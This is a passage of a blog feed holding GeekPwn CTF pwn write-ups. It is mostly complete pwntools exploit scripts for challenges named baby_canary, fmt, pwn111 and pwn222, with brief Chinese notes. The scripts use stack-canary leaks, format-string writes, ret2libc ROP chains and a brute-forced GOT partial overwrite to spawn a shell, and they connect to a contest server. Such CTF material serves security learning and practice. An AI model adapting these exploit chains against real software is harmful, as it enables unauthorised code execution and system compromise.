class="line"></span><br><span class="line">pop_ret&#x3D;0x0000000000400813</span><br><span class="line">def main():</span><br><span class="line">p.recvuntil(&quot;Do you want to play with me?\n&quot;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x70+&#39;aaaaaaaa&#39;+p64(pop_ret)+p64(0x4008B5)+p64(0x4007A2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="baby-canary"><a href="#baby-canary" class="headerlink" title="baby_canary"></a>baby_canary</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;81.69.0.47&#39;,3333)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;baby_canary&quot;)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret&#x3D;0x400873</span><br><span class="line"># bin_sh&#x3D;0x00000000004008ee</span><br><span class="line">bin_sh&#x3D;0x00000000004008ED</span><br><span class="line">system&#x3D;0x4007FC</span><br><span class="line">def main():</span><br><span class="line">p.recvuntil(&#39;plz tell me.\n&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x68</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;a&#39;*0x68)</span><br><span class="line">canary&#x3D;u64(p.recv(8).ljust(8,&quot;\x00&quot;))-0xa</span><br><span class="line">print hex(canary)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x68+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line"># p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p><strong>exp:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp：</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;81.69.0.47&#39;, 2222)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;fmt&quot;)</span><br><span class="line"></span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;fmt&#39;)</span><br><span class="line">system&#x3D;0x4012DB</span><br><span class="line"></span><br><span class="line">system_plt&#x3D;elf.plt[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">p.recvuntil(&#39;hello world!&#39;)</span><br><span class="line">bss&#x3D;0x40409C</span><br><span class="line">payload&#x3D;&#39;%&#39;+str(0x1000)+&#39;c%12$hn&#39;+&#39;%&#39;+str(0x1000)+&#39;c%13$hn&#39;+&#39;\x00&#39;*8+p64(bss)+p64(bss+2)  &#x2F;&#x2F;格式化字符串写入操作</span><br><span class="line">修改seed地址后两字节        修改seed地址前两字节                       两字节两字节修改的bss段安排</span><br><span class="line"># gdb.attach(p,&#39;b *0x401261\nc\n&#39;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">a&#x3D;[&#39;2121385791&#39;,&#39;1417272958&#39;,&#39;1222019344&#39;,&#39;189308997&#39;,&#39;2113086160&#39;,&#39;43315344&#39;,&#39;1978613629&#39;,&#39;710758478&#39;,&#39;1825758792&#39;,&#39;118621091&#39;,&#39;1330609383&#39;,&#39;97980547&#39;,&#39;203100239&#39;,&#39;120334289&#39;,&#39;1085921916&#39;,&#39;75582125&#39;]</span><br><span class="line">print(len(a))</span><br><span class="line">for i in range(0,len(a)):</span><br><span class="line">p.sendline(a[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;running sh&quot;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="pwn111"><a href="#pwn111" class="headerlink" title="pwn111"></a>pwn111</h2><p><strong>exp:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line"># context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;81.69.0.47&#39;, 1122)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;pwn111&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn111&#39;)</span><br><span class="line">pop_rbp_ret&#x3D;0x000000000040112d</span><br><span class="line">pop_rdi_ret&#x3D;0x0000000000401233</span><br><span class="line">write_plt&#x3D;elf.plt[&#39;write&#39;]</span><br><span class="line">libc_start_main_got&#x3D;elf.got[&#39;__libc_start_main&#39;]</span><br><span class="line"></span><br><span class="line">#libc中的基地址</span><br><span class="line">bin_sh_libc&#x3D;next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))                     #0x0000000000180544</span><br><span class="line">system_libc&#x3D;libc.symbols[&#39;system&#39;]</span><br><span class="line">print hex(bin_sh_libc)</span><br><span class="line">print hex(system_libc)</span><br><span class="line"></span><br><span class="line">#函数的偏移offset</span><br><span class="line">libc_start_main_offset&#x3D;libc.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;please input: &quot;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line">main&#x3D;0x0000000000401146</span><br><span class="line">rsi_r15_ret&#x3D;0x0000000000401231</span><br><span class="line">r14_r15_ret&#x3D;0x0000000000401230</span><br><span class="line">payload1&#x3D;&#39;a&#39;*0x88+p64(pop_rdi_ret)+p64(1)+p64(rsi_r15_ret)+p64(libc_start_main_got)+p64(0)+p64(write_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#打印出write()函数在got表中的地址</span><br><span class="line">libc_start_main_add&#x3D;u64(p.recv(6).ljust(8,&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">print &quot;libc_start_main_add&#x3D;&quot;+hex(libc_start_main_add)</span><br><span class="line">offset&#x3D;libc_start_main_add-libc_start_main_offset</span><br><span class="line">system_add&#x3D;offset+system_libc</span><br><span class="line">bin_sh_add&#x3D;offset+bin_sh_libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload2&#x3D;&#39;a&#39;*0x80+&#39;a&#39;*8+p64(pop_rdi_ret)+p64(bin_sh_add)+p64(system_add)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="GeekPwn" scheme="http://example.com/categories/GeekPwn/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Geekpwn Pwn222</title>
    <link href="http://example.com/2020/11/26/GeekPwn-pwn222/"/>
    <id>http://example.com/2020/11/26/GeekPwn-pwn222/</id>
    <published>2020-11-26T10:17:48.000Z</published>
    <updated>2020-11-26T10:17:48.891Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>无输出函数，尝试使用__do_global_dtors_aux时发现在栈上并没有残留的地址。</p><p>由于read()函数为该程序唯一输入程序，不考虑对其下手。剩下有realpath()函数和setvbuf()函数，realpath()函数为比较高级的函数，其附近的函数不好利用，而根据提供的libc库文件发现setvbuf()函数距离puts()函数非常的近，考虑用read()函数构造ROP修改setvbuf()got表的后两位，将其修改为puts()函数，由于修改了倒数第二位，所以每次只有1/16的几率修改成功。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># r=remote(&#x27;81.69.0.47&#x27;,2212)</span></span><br><span class="line">        r=process(<span class="string">&#x27;./pwn222&#x27;</span>)</span><br><span class="line">        elf = ELF(<span class="string">&#x27;./pwn222&#x27;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc&#x27;</span>)</span><br><span class="line">        rdi = <span class="number">0x401233</span></span><br><span class="line">        rsir15 = <span class="number">0x401231</span></span><br><span class="line">        leave = <span class="number">0x4011aa</span></span><br><span class="line">        bss = <span class="number">0x404500</span></span><br><span class="line">        setvbuf_got = elf.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">        read = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">        fake_puts = elf.symbols[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">        read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(setvbuf_got)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#r.sendline(cyclic(32)+p64(bss-8)+p64(rdi)+p64(0)+p64(rsir15)+p64(setvbuf_got)+p64(0))</span></span><br><span class="line">        make_puts = p64(rdi)+p64(<span class="number">0</span>)+p64(rsir15)+p64(setvbuf_got)+p64(<span class="number">0</span>)+p64(read)</span><br><span class="line">        leak_read = p64(rdi)+p64(read_got)+p64(fake_puts)</span><br><span class="line">        move_stack = p64(rdi)+p64(<span class="number">0</span>)+p64(rsir15)+p64(bss)+p64(<span class="number">0</span>)+p64(read)+p64(leave)</span><br><span class="line">        exp = make_puts + leak_read + move_stack</span><br><span class="line"></span><br><span class="line">        r.sendline(cyclic(<span class="number">32</span>)+p64(bss-<span class="number">8</span>)+exp)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        r.send(p16(<span class="number">0xf6a0</span>))</span><br><span class="line">        libc_addr = u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>) - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">        system = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">        r.sendline(p64(rdi)+p64(binsh)+p64(system))</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        r.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    
  </entry>
  
</feed>
